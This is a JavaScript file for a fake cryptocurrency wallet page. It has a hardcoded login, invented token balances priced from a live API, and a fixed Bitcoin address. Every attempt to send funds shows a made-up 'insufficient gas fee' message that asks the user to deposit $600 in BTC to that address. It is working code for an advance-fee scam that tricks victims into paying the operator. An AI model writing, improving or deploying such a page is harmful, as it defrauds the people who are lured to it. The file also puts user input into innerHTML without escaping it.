// app.js

const USERNAME = 'sarahhilton';
const PASSWORD = 'giveaway';
const BTC_RECEIVE_ADDRESS = 'bc1q7sjehwjvkhzwtmj8yj2srqylf06ds9gu88am72';

const tokens = [
  { symbol: 'BTC', name: 'Bitcoin', balance: 1.2 },
  { symbol: 'ETH', name: 'Ethereum', balance: 80 },
  { symbol: 'BNB', name: 'Binance Coin', balance: 200 },
  { symbol: 'SOL', name: 'Solana', balance: 500 },
  { symbol: 'USDC', name: 'USD Coin', balance: 5000 },
];

let prices = {};
let totalBalance = 0;

const loginScreen = document.getElementById('login-screen');
const dashboard = document.getElementById('dashboard');
const loginForm = document.getElementById('login-form');
const loginError = document.getElementById('login-error');
const logoutBtn = document.getElementById('logout-btn');
const totalBalanceEl = document.getElementById('total-balance');
const cryptoListEl = document.getElementById('crypto-list');

const modal = document.getElementById('modal');
const modalContent = document.getElementById('modal-content');
const modalClose = document.getElementById('modal-close');

function formatUSD(num) {
  return '$' + num.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

async function fetchPrices() {
  try {
    const ids = tokens.map(t => {
      if (t.symbol === 'BTC') return 'bitcoin';
      if (t.symbol === 'ETH') return 'ethereum';
      if (t.symbol === 'BNB') return 'binancecoin';
      if (t.symbol === 'SOL') return 'solana';
      if (t.symbol === 'USDC') return 'usd-coin';
      return '';
    }).join(',');

    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
    const data = await res.json();

    prices = {
      BTC: data.bitcoin.usd,
      ETH: data.ethereum.usd,
      BNB: data.binancecoin.usd,
      SOL: data.solana.usd,
      USDC: data['usd-coin'].usd,
    };
  } catch (err) {
    console.error('Failed to fetch prices', err);
    // Fallback prices if API fails
    prices = {
      BTC: 60000,
      ETH: 3500,
      BNB: 600,
      SOL: 150,
      USDC: 1,
    };
  }
}

function calculateTotal() {
  totalBalance = tokens.reduce((sum, t) => sum + t.balance * prices[t.symbol], 0);
}

function renderDashboard() {
  totalBalanceEl.textContent = formatUSD(totalBalance);

  cryptoListEl.innerHTML = '';

  tokens.forEach(token => {
    const value = token.balance * prices[token.symbol];
    const card = document.createElement('div');
    card.className = 'bg-gray-800 rounded-lg p-4 flex justify-between items-center shadow-lg';

    card.innerHTML = `
      <div>
        <h4 class="text-lg font-semibold">${token.name} (${token.symbol})</h4>
        <p>${token.balance} ${token.symbol} ≈ ${formatUSD(value)}</p>
      </div>
      <div class="space-x-2">
        <button class="send-btn bg-green-600 hover:bg-green-700 py-1 px-3 rounded transition" data-token="${token.symbol}">Send</button>
        <button class="receive-btn bg-blue-600 hover:bg-blue-700 py-1 px-3 rounded transition" data-token="${token.symbol}">Receive</button>
      </div>
    `;

    cryptoListEl.appendChild(card);
  });

  // Attach event listeners to new buttons
  attachButtonListeners();
}

function attachButtonListeners() {
  document.querySelectorAll('.send-btn').forEach(btn => {
    btn.onclick = () => openSendModal(btn.dataset.token);
  });

  document.querySelectorAll('.receive-btn').forEach(btn => {
    btn.onclick = () => openReceiveModal(btn.dataset.token);
  });
}

function openReceiveModal(token) {
  modalContent.innerHTML = `
    <h3 class="text-xl font-bold mb-4">Receive ${token === 'TOTAL' ? 'Bitcoin (BTC)' : token}</h3>
    <p class="mb-4">You can only receive BTC at this address:</p>
    <div id="qrcode" class="mb-4 flex justify-center"></div>
    <p class="break-all text-center font-mono">${BTC_RECEIVE_ADDRESS}</p>
    <button id="modal-close-btn" class="mt-6 w-full bg-blue-600 hover:bg-blue-700 py-2 rounded font-semibold text-white">Close</button>
  `;
  // Generate QR code
  const qrCodeContainer = document.getElementById('qrcode');
  qrCodeContainer.innerHTML = '';
  QRCode.toCanvas(qrCodeContainer, BTC_RECEIVE_ADDRESS, { width: 180 });

  document.getElementById('modal-close-btn').onclick = closeModal;
  showModal();
}

let sendModalState = {
  token: '',
  step: 'input', // 'input' or 'confirm'
  address: '',
  amount: 0,
};

function openSendModal(token) {
  sendModalState = { token, step: 'input', address: '', amount: 0 };
  renderSendStep();
  showModal();
}

function renderSendStep() {
  if (sendModalState.step === 'input') {
    modalContent.innerHTML = `
      <h3 class="text-xl font-bold mb-4">Send ${sendModalState.token === 'TOTAL' ? 'Bitcoin (BTC)' : sendModalState.token}</h3>
      <label class="block mb-2">Enter recipient address:</label>
      <input id="send-address" type="text" class="w-full p-2 rounded bg-gray-800 border border-gray-700 mb-4" placeholder="Address" value="${sendModalState.address}" />
      <label class="block mb-2">Amount to send:</label>
      <input id="send-amount" type="number" step="any" min="0" class="w-full p-2 rounded bg-gray-800 border border-gray-700 mb-6" placeholder="Amount" value="${sendModalState.amount}" />
      <div class="flex justify-end space-x-2">
        <button id="send-cancel" class="px-4 py-2 rounded bg-gray-700 hover:bg-gray-600">Cancel</button>
        <button id="send-next" class="px-4 py-2 rounded bg-green-600 hover:bg-green-700 text-white">Next</button>
      </div>
    `;

    document.getElementById('send-cancel').onclick = closeModal;
    document.getElementById('send-next').onclick = () => {
      const addr = document.getElementById('send-address').value.trim();
      const amt = parseFloat(document.getElementById('send-amount').value);
      if (!addr) {
        alert('Please enter a valid address');
        return;
      }
      if (!amt || amt <= 0) {
        alert('Please enter a valid amount');
        return;
      }
      sendModalState.address = addr;
      sendModalState.amount = amt;
      sendModalState.step = 'confirm';
      renderSendStep();
    };
  } else if (sendModalState.step === 'confirm') {
    modalContent.innerHTML = `
      <h3 class="text-xl font-bold mb-4">Confirm Transaction</h3>
      <p><strong>Token:</strong> ${sendModalState.token === 'TOTAL' ? 'Bitcoin (BTC)' : sendModalState.token}</p>
      <p><strong>To Address:</strong> <span class="break-all">${sendModalState.address}</span></p>
      <p><strong>Amount:</strong> ${sendModalState.amount}</p>
      <p class="mt-4 text-red-500 font-semibold">Insufficient gas fee to make this transaction.</p>
      <p>Deposit <strong>$600 worth of BTC</strong> here to complete transaction:</p>
      <p class="break-all font-mono mb-4">${BTC_RECEIVE_ADDRESS}</p>
      <div class="flex justify-end space-x-2">
        <button id="confirm-cancel" class="px-4 py-2 rounded bg-gray-700 hover:bg-gray-600">Cancel</button>
        <button id="confirm-deposit" class="px-4 py-2 rounded bg-yellow-600 hover:bg-yellow-700 text-white">Deposit BTC</button>
      </div>
    `;

    document.getElementById('confirm-cancel').onclick = closeModal;
    document.getElementById('confirm-deposit').onclick = () => {
      alert('Please deposit $600 worth of BTC to the address shown to complete the transaction.');
      closeModal();
    };
  }
}

function showModal() {
  modal.classList.remove('hidden');
}

function closeModal() {
  modal.classList.add('hidden');
}

loginForm.onsubmit = (e) => {
  e.preventDefault();
  const username = loginForm.username.value.trim();
  const password = loginForm.password.value;

  if (username === USERNAME && password === PASSWORD) {
    loginError.classList.add('hidden');
    loginScreen.classList.add('hidden');
    dashboard.classList.remove('hidden');

    // Fetch prices and render dashboard
    fetchPrices().then(() => {
      calculateTotal();
      renderDashboard();
    });
  } else {
    loginError.classList.remove('hidden');
  }
};

logoutBtn.onclick = () => {
  dashboard.classList.add('hidden');
  loginScreen.classList.remove('hidden');
  loginForm.reset();
};

modalClose.onclick = closeModal;

// Close modal if click outside content
modal.onclick = (e) => {
  if (e.target === modal) closeModal();
};
